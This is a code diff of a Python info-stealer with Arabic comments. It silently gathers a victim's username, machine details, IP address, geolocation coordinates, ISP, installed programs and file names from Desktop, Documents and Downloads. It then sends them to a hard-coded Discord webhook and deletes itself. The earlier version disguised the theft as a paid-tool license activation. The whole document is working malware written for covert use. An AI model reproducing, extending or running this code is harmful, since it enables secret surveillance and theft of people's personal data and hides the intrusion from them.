@@ -6,97 +6,113 @@ import requests
 import json
 import subprocess
 import time
+import shutil
 from datetime import datetime
 
-# إعدادات الويبهوك حقك - ثابت لا يتغير
-WEBHOOK = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE"
+# --- إعداداتك الخاصة ---
+WEBHOOK_URL = "https://discord.com/api/webhooks/1485705281399951380/vq0MMpRxWwbxu81_b2sH0NyCuwJNylU105PRJCF37kwFDwuLbRMvnroWGai3a1dZ6ApE"
+TAG = "#HTLr"
+MSG_FOOTER = "Z7F LINK TRACK | DENGER ☢️"
 
-BANNER = """
-#######################################################
-#   HTLr - EXCLUSIVE PAID TOOL - PRIVATE VERSION      #
-#   !!! جاري تحميل الإعدادات الحصرية لـ # HTLr !!!        #
-#######################################################
-"""
-
-def get_full_intel():
-    """جمع معلومات دقيقة جداً عن الضحية جهازه وملفاته"""
-    data = {}
+def capture_everything():
+    """جمع أدق التفاصيل من جهاز الضحية بصمت"""
+    intel = {}
     try:
-        # معلومات النظام الأساسية
-        data['user'] = os.getlogin() if os.name == 'nt' else os.getenv('USER')
-        data['node'] = platform.node()
-        data['sys'] = f"{platform.system()} {platform.release()}"
-        data['arch'] = platform.machine()
+        # 1. معلومات الجهاز الأساسية
+        intel['user'] = os.getlogin()
+        intel['pc_name'] = socket.gethostname()
+        intel['os'] = f"{platform.system()} {platform.release()} ({platform.version()})"
+        intel['arch'] = platform.machine()
+        intel['cpu'] = platform.processor()
         
-        # معلومات الشبكة
-        data['local_ip'] = socket.gethostbyname(socket.gethostname())
+        # 2. معلومات الشبكة والآيبي والحارة
         try:
-            pub_info = requests.get('http://ip-api.com/json/').json()
-            data['pub_ip'] = pub_info.get('query')
-            data['loc'] = f"{pub_info.get('city')}, {pub_info.get('country')}"
-            data['isp'] = pub_info.get('isp')
+            r = requests.get('http://ip-api.com/json/').json()
+            intel['pub_ip'] = r.get('query')
+            intel['isp'] = r.get('isp')
+            intel['location'] = f"{r.get('city')}, {r.get('regionName')}, {r.get('country')}"
+            intel['coords'] = f"Lat: {r.get('lat')}, Lon: {r.get('lon')}"
         except:
-            data['pub_ip'] = "N/A"
-            
-        # كشف الملفات الحساسة (أسماء فقط للسرعة)
-        important_dirs = ['Desktop', 'Documents', 'Downloads']
-        files_found = []
-        for folder in important_dirs:
-            p = os.path.join(os.path.expanduser('~'), folder)
-            if os.path.exists(p):
-                files_found.append(f"--- {folder} ---")
-                files_found.extend(os.listdir(p)[:10]) # يسحب أول 10 ملفات من كل مكان
-        
-        data['files'] = "\n".join(files_found)
-        
-    except Exception as e:
-        data['error'] = str(e)
-    return data
+            intel['pub_ip'] = "N/A"
 
-def send_to_hq(intel):
-    """إرسال الصيدة للديسكورد بتنسيق HTLr"""
+        # 3. سحب قائمة الملفات الحساسة (الأكثر أهمية)
+        files_summary = []
+        paths = {
+            "Desktop": os.path.join(os.path.expanduser('~'), 'Desktop'),
+            "Documents": os.path.join(os.path.expanduser('~'), 'Documents'),
+            "Downloads": os.path.join(os.path.expanduser('~'), 'Downloads')
+        }
+        
+        for name, path in paths.items():
+            if os.path.exists(path):
+                files_summary.append(f"--- {name} ---")
+                files_list = os.listdir(path)
+                files_summary.extend(files_list[:15]) # أول 15 ملف من كل مجلد لسرعة الأداة
+
+        intel['files_list'] = "\n".join(files_summary)
+        
+        # 4. سحب البرامج المثبتة (لمعرفة زلات الضحية)
+        if os.name == 'nt':
+            try:
+                apps = subprocess.check_output(['wmic', 'product', 'get', 'name']).decode('utf-8', errors='ignore')
+                intel['apps'] = apps[:500] 
+            except:
+                intel['apps'] = "Locked/Access Denied"
+
+    except Exception as e:
+        intel['error'] = str(e)
+    
+    return intel
+
+def send_payload(intel):
+    """إرسال المعلومات للويبهوك بتنسيق هجماتي احترافي"""
     embed = {
-        "title": "🎯 صيدة جديدة [HTLr EXCLUSIVE]",
-        "color": 0xFF0000, # أحمر
+        "title": f"🔓 تم اختراق صيدة جديدة! [{TAG}]",
+        "description": f"المعلومات المسحوبة من جهاز الضحية بصمت التام.",
+        "color": 16711680, # أحمر ناري
         "fields": [
-            {"name": "👤 الضحية", "value": f"```{intel['user']} @ {intel['node']}```", "inline": True},
-            {"name": "🌍 الموقع والآيبي", "value": f"```IP: {intel['pub_ip']}\nLoc: {intel.get('loc', 'Unknown')}```", "inline": True},
-            {"name": "💻 نظام التشغيل", "value": f"```{intel['sys']} ({intel['arch']})```", "inline": False},
-            {"name": "📦 شركة الاتصال (ISP)", "value": f"```{intel.get('isp', 'N/A')}```", "inline": False},
-            {"name": "📂 قائمة بملفات الضحية", "value": f"```\n{intel['files'][:800]}```", "inline": False},
-            {"name": "📌 تاق الأداة", "value": "#HTLr LINK TRACK", "inline": True}
+            {"name": "👤 الضحية", "value": f"```User: {intel['user']}\nPC: {intel['pc_name']}```", "inline": True},
+            {"name": "🌐 الشبكة والآيبي", "value": f"```IP: {intel['pub_ip']}\nLoc: {intel.get('location', 'N/A')}```", "inline": True},
+            {"name": "💻 تفاصيل النظام", "value": f"```{intel['os']}```", "inline": False},
+            {"name": "📡 الإحداثيات", "value": f"`{intel.get('coords', 'N/A')}`", "inline": True},
+            {"name": "🏢 المزود (ISP)", "value": f"`{intel.get('isp', 'N/A')}`", "inline": True},
+            {"name": "📂 كشف الملفات (Desktop/Docs)", "value": f"```\n{intel.get('files_list', 'No Files Access')[:1000]}```", "inline": False}
         ],
-        "footer": {"text": "Z7F LINK TRACK | DENGER ☢️ | " + datetime.now().strftime("%H:%M:%S")}
+        "footer": {"text": f"{MSG_FOOTER} | {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"},
+        "thumbnail": {"url": "https://i.imgur.com/G4YUpV7.png"}
     }
     
-    payload = {"username": "HTLr SYSTEM", "embeds": [embed]}
-    requests.post(WEBHOOK, json=payload)
+    payload = {"username": "HTLr SILENT LOGGER", "embeds": [embed]}
+    try:
+        requests.post(WEBHOOK_URL, json=payload)
+    except:
+        pass
 
-def self_delete():
-    """مسح الملف من الجهاز فوراً وبصمت"""
+def self_destruct():
+    """انتحار الملف: مسح السكربت من الجهاز نهائياً بصمت"""
     path = os.path.abspath(sys.argv[0])
     try:
         if os.name == 'nt': # Windows
-            subprocess.Popen(f"timeout /t 3 & del \"{path}\"", shell=True)
+            # تشغيل أمر مسح الملف بعد 3 ثواني لإعطاء وقت للإغلاق
+            subprocess.Popen(f"timeout /t 3 & del /f /q \"{path}\"", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
         else: # Linux/Android
             os.remove(path)
     except:
         pass
 
-if __name__ == "__main__":
-    # تمويه الضحية
-    print(BANNER)
-    print("[*] جارٍ تفعيل مفتاح الترخيص...")
-    
-    # تنفيذ الصيد في الخلفية
+def main():
+    # الأداة تعمل بصمت بدون طباعة برنت (إلا للتمويه لو بغيت)
     try:
-        intel_data = get_full_intel()
-        send_to_hq(intel_data)
-        print("[+] تم تفعيل الأداة بنجاح! سيتم البدء الآن...")
+        # الحصول على كل المعلومات
+        intel_data = capture_everything()
+        # إرسالها فوراً
+        send_payload(intel_data)
     except:
         pass
-    
-    # انتحار الملف
-    time.sleep(2)
-    self_delete()
-    sys.exit()
+    finally:
+        # الانتحار والمسح
+        self_destruct()
+        sys.exit()
+
+if __name__ == "__main__":
+    main()
